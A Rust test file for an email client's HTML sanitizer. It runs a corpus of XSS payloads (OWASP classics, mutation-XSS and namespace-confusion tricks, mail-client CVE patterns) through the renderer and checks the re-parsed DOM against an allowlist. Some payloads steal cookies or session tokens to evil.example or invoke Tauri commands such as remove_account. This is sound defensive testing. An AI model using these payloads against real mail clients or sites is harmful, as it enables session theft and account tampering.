//! XSS corpus. Every payload is rendered, then the OUTPUT is re-parsed with
//! html5ever (the same HTML5 parsing algorithm browsers use) and the
//! resulting DOM is checked against the allowlist. Checking the re-parsed
//! tree rather than the string is what catches mutation XSS: markup that
//! the sanitizer saw as harmless but that parses differently the second time.

use std::collections::HashSet;

use html5ever::ns;

use super::test_dom::{parse as reparse, Data, Handle};
use super::*;

fn allowed_attrs(tag: &str) -> HashSet<&'static str> {
    let mut s: HashSet<&'static str> = GENERIC_ATTRIBUTES.iter().copied().collect();
    if let Some((_, a)) = TAG_ATTRIBUTES.iter().find(|(t, _)| *t == tag) {
        s.extend(a.iter().copied());
    }
    if tag == "a" {
        s.extend(["target", "rel"]);
    }
    s
}

/// Lowercase and drop everything a browser ignores when sniffing a scheme.
fn squash(v: &str) -> String {
    v.chars()
        .filter(|c| !c.is_whitespace() && !c.is_control())
        .collect::<String>()
        .to_ascii_lowercase()
}

fn check_css(css: &str, allow_remote: bool, ctx: &str) {
    let l = css.to_ascii_lowercase();
    for bad in [
        "expression",
        "javascript",
        "vbscript",
        "behavior",
        "binding",
        "@import",
        "\\",
        "</",
        "<!--",
        "position:fixed",
        "position: fixed",
        "@font-face",
    ] {
        assert!(!l.contains(bad), "{ctx}: forbidden `{bad}` in CSS: {css}");
    }
    for (i, _) in l.match_indices("url(") {
        let arg = &l[i + 4..];
        let ok =
            arg.starts_with("\"data:image/") || (allow_remote && arg.starts_with("\"https://"));
        assert!(ok, "{ctx}: unexpected url() in CSS: {css}");
    }
}

fn check_image_url(v: &str, allow_remote: bool, ctx: &str) {
    let s = squash(v);
    let ok = (s.starts_with("data:image/")
        && s.contains(";base64,")
        && !s.starts_with("data:image/svg"))
        || (allow_remote && s.starts_with("https://"));
    assert!(ok, "{ctx}: unsafe image url {v:?}");
}

fn walk(node: &Handle, in_head: bool, allow_remote: bool, ctx: &str, styles: &mut usize) {
    if let Data::Element {
        name,
        attrs,
        template,
        ..
    } = &node.data
    {
        assert_eq!(
            name.ns,
            ns!(html),
            "{ctx}: foreign-namespace element <{}>",
            name.local
        );
        assert!(template.is_none(), "{ctx}: template contents");
        let tag = &*name.local;
        let structural = matches!(tag, "html" | "head" | "body");
        let head_only = matches!(tag, "meta" | "style");
        assert!(
            structural || (head_only && in_head) || (!in_head && TAGS.contains(&tag)),
            "{ctx}: disallowed element <{tag}> (in_head={in_head})"
        );
        if tag == "style" {
            *styles += 1;
            let text: String = node
                .children
                .borrow()
                .iter()
                .filter_map(|c| match &c.data {
                    Data::Text(contents) => Some(contents.borrow().to_string()),
                    _ => None,
                })
                .collect();
            check_css(&text, allow_remote, ctx);
        }
        for attr in attrs.borrow().iter() {
            let an = &*attr.name.local;
            let v = &*attr.value;
            assert!(attr.name.ns == ns!(), "{ctx}: namespaced attribute {an}");
            assert!(!an.starts_with("on"), "{ctx}: event handler {an}={v:?}");
            match tag {
                "html" => assert_eq!(an, "class", "{ctx}"),
                "meta" => {
                    assert!(
                        matches!(an, "charset" | "http-equiv" | "content" | "name"),
                        "{ctx}: meta attr {an}"
                    );
                    if an == "http-equiv" {
                        assert_eq!(
                            v.to_ascii_lowercase(),
                            "content-security-policy",
                            "{ctx}: meta http-equiv"
                        );
                    }
                }
                "div" if an == "class" && v == "pg-root" => {}
                _ => assert!(
                    allowed_attrs(tag).contains(an),
                    "{ctx}: disallowed attribute {tag}[{an}]"
                ),
            }
            match an {
                "href" => {
                    let s = squash(v);
                    assert!(
                        s.starts_with("https://")
                            || s.starts_with("http://")
                            || s.starts_with("mailto:"),
                        "{ctx}: unsafe href {v:?}"
                    );
                }
                "src" | "background" => check_image_url(v, allow_remote, ctx),
                "srcset" => v.split(',').for_each(|c| {
                    check_image_url(c.split_whitespace().next().unwrap_or(""), allow_remote, ctx)
                }),
                "style" => check_css(v, allow_remote, ctx),
                "target" => assert_eq!(v, "_blank", "{ctx}"),
                _ => {
                    let s = squash(v);
                    assert!(
                        !s.starts_with("javascript:")
                            && !s.starts_with("vbscript:")
                            && !s.starts_with("data:text"),
                        "{ctx}: script URL in {tag}[{an}]"
                    );
                }
            }
        }
        let child_in_head = in_head || tag == "head";
        for c in node.children.borrow().iter() {
            walk(c, child_in_head, allow_remote, ctx, styles);
        }
    } else {
        for c in node.children.borrow().iter() {
            walk(c, in_head, allow_remote, ctx, styles);
        }
    }
}

/// Render `payload` both with images blocked and allowed, and check the DOM
/// a browser would build from our output. The allowed pass also turns the
/// tracking settings to their permissive side (pixels load, links are
/// rewritten), so those paths see the whole corpus too.
fn assert_safe(payload: &str) -> String {
    let mut blocked_output = String::new();
    for allow in [false, true] {
        let opts = RenderOptions {
            allow_remote_images: allow,
            cid_map: Default::default(),
            allow_tracking_pixels: allow,
            strip_link_tracking: allow,
        };
        let out = render_html(payload, &opts).html;
        assert!(out.starts_with(HTML_DOC_PREFIX));
        let csp_meta = format!(
            "<meta http-equiv=\"Content-Security-Policy\" content=\"{}\">",
            csp(allow)
        );
        assert!(out.contains(&csp_meta), "CSP meta missing");
        assert!(
            out.find(&csp_meta) < out.find("<body"),
            "CSP must precede content"
        );
        let dom = reparse(&out);
        let mut styles = 0;
        walk(
            &dom.document,
            false,
            allow,
            &format!("payload {payload:?}"),
            &mut styles,
        );
        assert!(styles <= 2, "payload {payload:?}: {styles} style elements");
        if !allow {
            blocked_output = out;
        }
    }
    blocked_output
}

/// OWASP filter-evasion classics, event handlers, and dangerous elements.
pub(crate) const CLASSICS: &[&str] = &[
    "<script>alert(1)</script>",
    "<SCRIPT SRC=https://xss.example/xss.js></SCRIPT>",
    "<script/xss src=https://xss.example/x.js></script>",
    "<<SCRIPT>alert(1);//<</SCRIPT>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=\"alert(1)\"//",
    "<IMG SRC=\"jav\tascript:alert('XSS');\">",
    "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
    "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
    "<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
    "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
    "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097>",
    "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74>",
    "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\"\\>",
    "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
    "<IMG SRC=# onmouseover=\"alert('xxs')\">",
    "<IMG onmouseover=\"alert('xxs')\">",
    "<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>",
    "<img src=x:alert(alt) onerror=eval(src) alt=0>",
    "<BODY ONLOAD=alert('XSS')>",
    "<BODY BACKGROUND=\"javascript:alert('XSS')\">",
    "<body onpageshow=alert(1)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<svg><a xlink:href=\"javascript:alert(1)\"><text x=20 y=20>XSS</text></a></svg>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<svg><set attributeName=href to=javascript:alert(1) /></svg>",
    "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(1)' /></svg>#x\" />",
    "<iframe src=javascript:alert(1)></iframe>",
    "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
    "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></iframe>",
    "<object data=\"javascript:alert(1)\"></object>",
    "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>",
    "<embed src=\"javascript:alert(1)\">",
    "<embed src=\"https://xss.example/x.swf\" allowscriptaccess=always>",
    "<applet code=\"javascript:alert(1)\"></applet>",
    "<form action=\"javascript:alert(1)\"><input type=submit></form>",
    "<form><button formaction=javascript:alert(1)>X</button></form>",
    "<input type=image src=x onerror=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus><option>x</select>",
    "<textarea onfocus=alert(1) autofocus>",
    "<keygen onfocus=alert(1) autofocus>",
    "<video><source onerror=alert(1)></video>",
    "<video poster=javascript:alert(1)></video>",
    "<audio src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<isindex type=image src=1 onerror=alert(1)>",
    "<isindex action=javascript:alert(1) type=image>",
    "<a href=\"javascript:alert(1)\">x</a>",
    "<a href=\"JaVaScRiPt:alert(1)\">x</a>",
    "<a href=\"  javascript:alert(1)\">x</a>",
    "<a href=\"java&#115;cript:alert(1)\">x</a>",
    "<a href=\"java&Tab;script:alert(1)\">x</a>",
    "<a href=\"javascript&colon;alert(1)\">x</a>",
    "<a href=\"&#1;javascript:alert(1)\">x</a>",
    "<a href=\"vbscript:msgbox(1)\">x</a>",
    "<a href=\"livescript:alert(1)\">x</a>",
    "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">x</a>",
    "<a href=\"data:text/html,<script>alert(1)</script>\">x</a>",
    "<a href=\"file:///etc/passwd\">x</a>",
    "<a href=\"ipc://localhost/open_external\">x</a>",
    "<a href=\"tauri://localhost/index.html\">x</a>",
    "<a href=\"//evil.example/\">protocol-relative</a>",
    "<a href=\"x\" ping=\"https://track.example/\">x</a>",
    "<a href=\"https://ok.example\" target=\"_top\">x</a>",
    "<a href=\"https://ok.example\" onclick=\"alert(1)\">x</a>",
    "<area href=javascript:alert(1)>",
    "<map><area shape=rect coords=0,0,100,100 href=javascript:alert(1)></map>",
    "<math href=\"javascript:alert(1)\">CLICK</math>",
    "<math><maction actiontype=statusline xlink:href=javascript:alert(1)>X</maction></math>",
    "<table background=\"javascript:alert(1)\"><tr><td background=\"javascript:alert(1)\">x</td></tr></table>",
    "<div style=\"background-image: url(javascript:alert(1))\">",
    "<div style=\"width: expression(alert(1))\">",
    "<div style=\"behavior: url(xss.htc)\">",
    "<div style=\"-moz-binding: url(https://xss.example/xss.xml#xss)\">",
    "<div style=\"background:url('java\\73 cript:alert(1)')\">",
    "<div style=\"xss:expr/*XSS*/ession(alert(1))\">",
    "<div style=\"background:url(&quot;javascript:alert(1)&quot;)\">",
    "<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999\">overlay</div>",
    "<div style=\"list-style-image:url(https://track.example/p.gif)\">",
    "<div style=\"cursor:url(https://track.example/c.cur),auto\">",
    "<div style=\"content:url(https://track.example/c.png)\">",
    "<div style=\"background-image:image-set('https://track.example/a.png' 1x)\">",
    "<div style=\"color:red;}</style><script>alert(1)</script>\">",
    "<style>@import 'https://xss.example/x.css';</style>",
    "<style>body{background:url(\"javascript:alert(1)\")}</style>",
    "<style>*{-moz-binding:url(https://xss.example/x.xml)}</style>",
    "<style>.x{width:expression(alert(1))}</style>",
    "<style></style><script>alert(1)</script><style></style>",
    "<style>a{color:red}</style ><img src=x onerror=alert(1)>",
    "<style>@font-face{font-family:x;src:url(https://track.example/f.woff)}</style>",
    "<style>input[value^=a]{background:url(https://leak.example/a)}</style>",
    "<link rel=stylesheet href=https://xss.example/x.css>",
    "<link rel=import href=https://xss.example/x.html>",
    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
    "<meta http-equiv=\"refresh\" content=\"0; url=https://phish.example/\">",
    "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src *\">",
    "<meta charset=\"x-imap4-modified-utf7\">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi",
    "<base href=\"javascript:alert(1)//\">",
    "<base href=\"https://evil.example/\"><a href=\"/x\">rel</a>",
    "<xml><x:xss><img src=x onerror=alert(1)></x:xss></xml>",
    "<xss style=\"xss:expression(alert(1))\">",
    "<frameset><frame src=javascript:alert(1)></frameset>",
    "<portal src=https://evil.example></portal>",
    "<template><img src=x onerror=alert(1)></template>",
    "<dialog open onclose=alert(1)><form method=dialog><button>x</button></form></dialog>",
    "<object type=\"text/x-scriptlet\" data=\"https://xss.example/x.sct\"></object>",
    "<div id=\"x\" style=\"x:\\65xpression(alert(1))\">",
    "<a href=\"https://ok.example/\" style=\"display:block;position:absolute;top:-9999px\">ok</a>",
    "<img src=\"cid:missing@x\" onerror=alert(1)>",
    "<img srcset=\"javascript:alert(1) 1x, https://ok.example/a.png 2x\">",
    "<img srcset=\"data:image/svg+xml;base64,PHN2Zz4= 1x\">",
    "<img src=\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\">",
    "<img src=\"data:image/png;base64,iVBOR\" onload=alert(1)>",
    "<img src=\"data:text/html;base64,PHNjcmlwdD4=\">",
    "<!--<img src=x onerror=alert(1)>-->",
    "<!--[if gte IE 4]><script>alert(1)</script><![endif]-->",
    "<![CDATA[<img src=x onerror=alert(1)>]]>",
    "<?xml version=\"1.0\"?><img src=x onerror=alert(1)>",
    "<!DOCTYPE html><html><head><script>alert(1)</script></head><body onload=alert(1)></body></html>",
    "<div onmouseover=\"alert(1)\" ONMOUSEOVER=alert(2) oNmOuSeOvEr=alert(3)>x</div>",
    "<div title=\"&quot; onmouseover=alert(1) x=&quot;\">x</div>",
    "<p title=\"</p><img src=x onerror=alert(1)>\">x</p>",
    "<a title=\"<script>alert(1)</script>\" href=\"https://ok.example\">x</a>",
];

/// Mutation XSS and namespace confusion: payloads that exploit the parser
/// re-parsing sanitized output differently (DOMPurify bypass history,
/// Masato Kinugawa, Michał Bentkowski, Gareth Heyes).
pub(crate) const MXSS: &[&str] = &[
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    "<noscript><style></noscript><img src=x onerror=alert(1)></style></noscript>",
    "<svg></p><style><a id=\"</style><img src=1 onerror=alert(1)>\">",
    "<svg><p><style><a id=\"</style><img src=1 onerror=alert(1)>\"></p></svg>",
    "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;\">",
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>",
    "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
    "<math><mi><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert(1) src=1>\">",
    "<svg><foreignObject><p>x</p><img src=x onerror=alert(1)></foreignObject></svg>",
    "<svg><desc><img src=x onerror=alert(1)></desc></svg>",
    "<svg><title><img src=x onerror=alert(1)></title></svg>",
    "<math><annotation-xml encoding=\"text/html\"><img src=x onerror=alert(1)></annotation-xml></math>",
    "<svg><style><img src=x onerror=alert(1)></style></svg>",
    "<svg><iframe><a title=\"</iframe><img src onerror=alert(1)>\">test",
    "<svg><xmp><a title=\"</xmp><img src onerror=alert(1)>\">",
    "<svg><noembed><a title=\"</noembed><img src onerror=alert(1)>\">",
    "<svg><noframes><a title=\"</noframes><img src onerror=alert(1)>\">",
    "<svg><textarea><a title=\"</textarea><img src onerror=alert(1)>\">",
    "<svg><title><a title=\"</title><img src onerror=alert(1)>\">",
    "<svg><plaintext><a title=\"</plaintext><img src onerror=alert(1)>\">",
    "<math><style><a title=\"</style><img src onerror=alert(1)>\">",
    "<table><svg><style><a title=\"</style><img src onerror=alert(1)>\">",
    "<select><template><style></template><img src onerror=alert(1)></style></template></select>",
    "<select><style></select><img src onerror=alert(1)></style></select>",
    "<xmp><img src=x onerror=alert(1)></xmp>",
    "<xmp><p title=\"</xmp><img src=x onerror=alert(1)>\">",
    "<title><img src=x onerror=alert(1)></title>",
    "<textarea><img src=x onerror=alert(1)></textarea>",
    "<iframe><img src=x onerror=alert(1)></iframe>",
    "<noembed><img src=x onerror=alert(1)></noembed>",
    "<noframes><img src=x onerror=alert(1)></noframes>",
    "<plaintext><img src=x onerror=alert(1)>",
    "<listing>&lt;img src=x onerror=alert(1)&gt;</listing>",
    "<a href=\"https://ok.example\"><table><a href=\"javascript:alert(1)\">x</a></table></a>",
    "<table><tr><td><style></td><img src=x onerror=alert(1)></style>",
    "<p><table></p><img src=x onerror=alert(1)></table>",
    "<div><form><div></form><img src=x onerror=alert(1)></div>",
    "<a><a href=javascript:alert(1)>x",
    "<![CDATA[><img src=x onerror=alert(1)>]]>",
    "<svg><![CDATA[><img src=x onerror=alert(1)>]]></svg>",
    "<math><![CDATA[</math><img src=x onerror=alert(1)>]]>",
    "<svg><![CDATA[</svg><style></style><img src=x onerror=alert(1)>]]>",
    "<!--><img src=x onerror=alert(1)>-->",
    "<!---><img src=x onerror=alert(1)>-->",
    "<!-- --!><img src=x onerror=alert(1)>-->",
    "<img src=\"x` `<script>alert(1)</script>\"` `>",
    "<a href=\"https://ok.example\" title=\"\u{2028}<img src=x onerror=alert(1)>\">x</a>",
    "<div id=\"\u{0}\"><img src=x onerror=alert(1)></div>",
    "<img/src=x/onerror=alert(1)>",
    "<img src=x\u{0c}onerror=alert(1)>",
    "<img\u{0}src=x onerror=alert(1)>",
];

/// Real-world client CVE shapes.
pub(crate) const CLIENT_CVES: &[&str] = &[
    // Zero (Mail-0) CVE-2025-52557: a denylist (`querySelectorAll('script,
    // object, embed, form, input, button')`) followed by
    // dangerouslySetInnerHTML into the app's own DOM, so event handlers and
    // javascript: URLs on any other element ran with the app's session.
    "<div><img src=\"x\" onerror=\"fetch('https://evil.example/?c='+document.cookie)\"></div>",
    "<a href=\"javascript:fetch('https://evil.example/'+localStorage.getItem('session'))\">Open invoice</a>",
    "<details open ontoggle=\"window.parent.postMessage('pwn','*')\"><summary>x</summary></details>",
    "<svg><animate onbegin=\"top.location='https://evil.example'\" attributeName=x dur=1s>",
    "<iframe srcdoc=\"&lt;script&gt;parent.__TAURI_INTERNALS__.invoke('open_external',{url:'https://evil.example'})&lt;/script&gt;\"></iframe>",
    "<video><source onerror=\"parent.__TAURI_INTERNALS__.invoke('remove_account',{accountId:'x'})\"></video>",
    // Roundcube CVE-2025-68461: SVG <animate> rewriting href to javascript:.
    "<svg><a><animate attributeName=\"href\" values=\"javascript:alert(1)\"/><text x=\"20\" y=\"20\">click</text></a></svg>",
    "<svg><a><set attributeName=\"href\" to=\"javascript:alert(1)\"/><text x=\"20\" y=\"20\">click</text></a></svg>",
    "<svg><a xlink:href=\"#\"><animate attributeName=\"xlink:href\" begin=\"0\" from=\"javascript:alert(1)\" to=\"&\" /><text x=\"20\" y=\"20\">click</text></a></svg>",
    // Roundcube CVE-2024-37383 / CVE-2024-42009 (body/attribute confusion).
    "<body title=\"bgcolor=foo\" name=\"bar style=animation-name:progress-bar-stripes onanimationstart=alert(origin) foo=bar\">Foo</body>",
    "<svg><animate attributeName=\"href \" values=\"javascript:alert(1)\" /></svg>",
    // Roundcube CVE-2026-26079 class: CSS injection via style content.
    "<style>@import url(\"https://evil.example/leak.css\");</style>",
    "<style>body{background-image:url(\"https://evil.example/leak?\" + attr(data-x))}</style>",
    "<div style=\"background:url(https://evil.example/\\22)\">",
    // Zimbra CVE-2022-24682 / CVE-2023-37580 style: reflected/attribute breakouts.
    "<img src=\"https://ok.example/a.png\" alt='\"><script>alert(1)</script>'>",
    "<a href=\"https://ok.example/?q=\\\"onmouseover=alert(1)//\">x</a>",
    "<a href=\"https://ok.example/?x=%22%3E%3Cscript%3Ealert(1)%3C/script%3E\">x</a>",
    "<form id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>",
    // Outlook/Thunderbird-style conditional and VML content.
    "<!--[if mso]><v:rect xmlns:v=\"urn:schemas-microsoft-com:vml\" onload=alert(1)><v:fill src=\"javascript:alert(1)\"/></v:rect><![endif]-->",
    "<v:image src=\"javascript:alert(1)\" onload=alert(1)></v:image>",
    "<o:p onmouseover=alert(1)>x</o:p>",
];

#[test]
fn classic_payloads_are_neutralized() {
    for p in CLASSICS {
        assert_safe(p);
    }
}

#[test]
fn mutation_xss_and_namespace_confusion() {
    for p in MXSS {
        assert_safe(p);
    }
}

#[test]
fn mail_client_cve_patterns() {
    for p in CLIENT_CVES {
        let out = assert_safe(p);
        assert!(
            !out.to_ascii_lowercase().contains("<svg"),
            "svg survived: {p}"
        );
    }
}

/// Every scheme trick in every attribute that can carry a URL, on every tag
/// that has one.
#[test]
fn script_urls_in_every_url_attribute() {
    let schemes = [
        "javascript:alert(1)",
        "JaVaScRiPt:alert(1)",
        " \t javascript:alert(1)",
        "java\tscript:alert(1)",
        "java\nscript:alert(1)",
        "&#106;avascript:alert(1)",
        "&#x6A;avascript:alert(1)",
        "javascript&#58;alert(1)",
        "javascript&colon;alert(1)",
        "\u{1}javascript:alert(1)",
        "vbscript:msgbox(1)",
        "livescript:alert(1)",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "data:text/html,<script>alert(1)</script>",
        "data:image/svg+xml,<svg onload=alert(1)>",
        "data:application/xhtml+xml,<x:script xmlns:x='http://www.w3.org/1999/xhtml'>alert(1)</x:script>",
        "file:///etc/passwd",
        "ipc://localhost/remove_account",
        "tauri://localhost/",
        "about:blank",
        "blob:https://x.example/uuid",
        "filesystem:https://x.example/temporary/x",
        "x-apple-data-detectors://0",
        "smb://evil.example/share",
        // App-private schemes the app CSP allows for its own UI (avatars);
        // email content must never reach them.
        "avatar://localhost/0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef.png",
        "http://avatar.localhost/0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef.png",
    ];
    let cases = [
        ("a", "href"),
        ("a", "ping"),
        ("img", "src"),
        ("img", "srcset"),
        ("img", "lowsrc"),
        ("img", "dynsrc"),
        ("img", "longdesc"),
        ("table", "background"),
        ("td", "background"),
        ("body", "background"),
        ("div", "background"),
        ("iframe", "src"),
        ("frame", "src"),
        ("embed", "src"),
        ("object", "data"),
        ("object", "codebase"),
        ("form", "action"),
        ("button", "formaction"),
        ("input", "formaction"),
        ("input", "src"),
        ("video", "poster"),
        ("video", "src"),
        ("audio", "src"),
        ("source", "src"),
        ("track", "src"),
        ("link", "href"),
        ("base", "href"),
        ("blockquote", "cite"),
        ("q", "cite"),
        ("del", "cite"),
        ("ins", "cite"),
        ("area", "href"),
        ("math", "href"),
        ("html", "manifest"),
        ("meta", "content"),
        ("div", "xlink:href"),
        ("img", "usemap"),
        ("div", "data-href"),
    ];
    for (tag, attr) in cases {
        for s in schemes {
            let payload = format!("<{tag} {attr}=\"{s}\">x</{tag}>");
            assert_safe(&payload);
            let styled = format!("<{tag} style=\"background:url('{s}')\">x</{tag}>");
            assert_safe(&styled);
        }
    }
}

#[test]
fn unclosed_and_malformed_markup() {
    for p in [
        "<a href=\"https://ok.example\"",
        "<img src=\"x\" onerror=\"alert(1)",
        "<div><span><b><i><table><tr><td>",
        "<style>body{color:red",
        "<style>body{background:url(",
        "<script>alert(1)",
        "<!--",
        "<![CDATA[",
        "<a href='https://ok.example'>x<img src=x onerror=alert(1)//",
        "</div></div></div><img src=x onerror=alert(1)>",
        "<table><tr><td>a</td><td>b",
        "<p style=\"color:red",
        "<",
        "<<<<>>>>",
        "<img src=\"\u{fffd}\u{0}\">",
        "\u{feff}<img src=x onerror=alert(1)>",
        "<a href=\"https://ok.example/\u{202e}fdp.exe\">x</a>",
    ] {
        assert_safe(p);
    }
}

#[test]
fn huge_and_deep_inputs_do_not_crash() {
    // 50k nested divs: ammonia cleans iteratively and the html5ever
    // serializer must not overflow the stack of a 2 MB tokio worker.
    let deep = "<div>".repeat(50_000) + "x" + &"</div>".repeat(50_000);
    let handle = std::thread::Builder::new()
        .stack_size(2 * 1024 * 1024)
        .spawn(move || {
            let t = std::time::Instant::now();
            let out = render_html(&deep, &RenderOptions::default()).html;
            (out, t.elapsed())
        })
        .unwrap();
    let (out, took) = handle.join().expect("deep nesting crashed the renderer");
    assert!(
        out.starts_with(TEXT_DOC_PREFIX) && out.contains("Simplified view"),
        "complexity guard"
    );
    assert!(
        took < std::time::Duration::from_secs(1),
        "deep nesting took {took:?}"
    );

    // Just under the guard still renders as HTML, and stays quick.
    let nested = "<table><tr><td>".repeat(600) + "x";
    let r = render_html(&nested, &RenderOptions::default());
    assert!(r.html.starts_with(HTML_DOC_PREFIX));

    let attrs = format!(
        "<div {}>x<img src=x onerror=alert(1)></div>",
        (0..20_000)
            .map(|i| format!("data-a{i}=\"{i}\" onx{i}=alert(1)"))
            .collect::<Vec<_>>()
            .join(" ")
    );
    let t = std::time::Instant::now();
    let out = render_html(&attrs, &RenderOptions::default()).html;
    assert!(t.elapsed() < std::time::Duration::from_secs(1));
    assert!(
        out.contains("Simplified view") && !out.contains("<img"),
        "attribute flood falls back to text"
    );
    let few_attrs = format!(
        "<div {}>x</div>",
        (0..60)
            .map(|i| format!("data-a{i}=\"{i}\" onx{i}=alert(1)"))
            .collect::<Vec<_>>()
            .join(" ")
    );
    assert_safe(&few_attrs);
    let long_style = format!("<div style=\"{}\">x</div>", "color:red;".repeat(100_000));
    assert_safe(&long_style);
    let long_css = format!("<style>{}</style>", ".a{color:red}".repeat(200_000));
    assert_safe(&long_css);
    let unterminated_comment = format!("<style>a{{color:red}}/*{}</style>", "x".repeat(1_000_000));
    assert_safe(&unterminated_comment);
}

/// The oracle itself must reject unsanitized markup, or the corpus above
/// proves nothing.
#[test]
fn oracle_rejects_unsafe_documents() {
    for raw in [
        "<img src=x onerror=alert(1)>",
        "<a href=\"javascript:alert(1)\">x</a>",
        "<svg><a>x</a></svg>",
        "<div style=\"background:url(https://t.example/p.gif)\">x</div>",
        "<script>alert(1)</script>",
        "<iframe srcdoc=x></iframe>",
        "<template><b>x</b></template>",
    ] {
        let doc = format!("{HTML_DOC_PREFIX}<head></head><body>{raw}</body></html>");
        let dom = reparse(&doc);
        let caught = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
            walk(&dom.document, false, false, "oracle", &mut 0)
        }))
        .is_err();
        assert!(caught, "oracle missed: {raw}");
    }
}

/// The composer profiles (`compose.rs`, owned by richtext) feed a
/// contenteditable in the app's own, script-running document, so they get
/// the same corpus and re-parse oracle, against their tighter allowlist.
#[test]
fn composer_profiles_survive_the_corpus() {
    use crate::compose::{
        cid_map, sanitize_compose_html, sanitize_compose_html_with_images, sanitize_outgoing_html,
        sanitize_outgoing_html_with_images, sanitize_quoted_html, sanitize_quoted_html_with_images,
    };
    const COMPOSE_TAGS: &[&str] = &[
        "a",
        "b",
        "blockquote",
        "br",
        "code",
        "del",
        "div",
        "em",
        "h1",
        "h2",
        "h3",
        "h4",
        "h5",
        "h6",
        "hr",
        "i",
        "li",
        "ol",
        "p",
        "pre",
        "s",
        "span",
        "strike",
        "strong",
        "u",
        "ul",
    ];
    fn walk_compose(node: &Handle, ctx: &str, images: bool) {
        if let Data::Element {
            name,
            attrs,
            template,
            ..
        } = &node.data
        {
            let tag = &*name.local;
            assert_eq!(name.ns, ns!(html), "{ctx}: foreign element <{tag}>");
            assert!(template.is_none(), "{ctx}: template");
            assert!(
                matches!(tag, "html" | "head" | "body")
                    || COMPOSE_TAGS.contains(&tag)
                    || (images && tag == "img"),
                "{ctx}: <{tag}>"
            );
            for a in attrs.borrow().iter() {
                let (an, v) = (&*a.name.local, &*a.value);
                assert!(
                    matches!(an, "class" | "dir" | "style" | "href" | "title" | "start")
                        || (tag == "img" && matches!(an, "src" | "alt" | "width" | "height")),
                    "{ctx}: {tag}[{an}]"
                );
                if an == "src" {
                    // Only the ids the map hands out.
                    assert!(
                        v == "cid:pg-x@penguin.invalid" || v == "cid:pg-logo@penguin.invalid",
                        "{ctx}: src {v:?}"
                    );
                }
                if an == "href" {
                    let s = squash(v);
                    assert!(
                        s.starts_with("https://")
                            || s.starts_with("http://")
                            || s.starts_with("mailto:"),
                        "{ctx}: href {v:?}"
                    );
                }
                if an == "style" {
                    let l = v.to_ascii_lowercase();
                    assert!(
                        !l.contains('(') && !l.contains('\\') && !l.contains("/*"),
                        "{ctx}: style {v:?}"
                    );
                }
            }
        }
        for c in node.children.borrow().iter() {
            walk_compose(c, ctx, images);
        }
    }
    let matrix: Vec<String> = [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "vbscript:x",
    ]
    .iter()
    .flat_map(|s| {
        [
            format!("<a href=\"{s}\">x</a>"),
            format!("<p style=\"background:url('{s}')\">x</p>"),
        ]
    })
    .collect();
    let all = CLASSICS
        .iter()
        .chain(MXSS)
        .chain(CLIENT_CVES)
        .map(|s| s.to_string())
        .chain(matrix);
    for p in all {
        for (name, f) in [
            ("editor", sanitize_compose_html as fn(&str) -> String),
            ("outgoing", sanitize_outgoing_html),
            ("quoted", sanitize_quoted_html),
        ] {
            let once = f(&p);
            let ctx = format!("{name} {p:?}");
            walk_compose(
                &reparse(&format!("<!DOCTYPE html><body>{once}")).document,
                &ctx,
                false,
            );
            // A single call must be a fixpoint: drafts are re-sanitized on
            // every reopen, and output that re-parses into a different tree
            // is the shape mutation XSS feeds on.
            assert_eq!(f(&once), once, "{ctx}: not idempotent");
            // A quoted original rides inside the composer's HTML part, which
            // is re-sanitized at send: it must come through unchanged.
            assert_eq!(
                sanitize_outgoing_html(&once),
                once,
                "{ctx}: changed at send"
            );
        }
    }
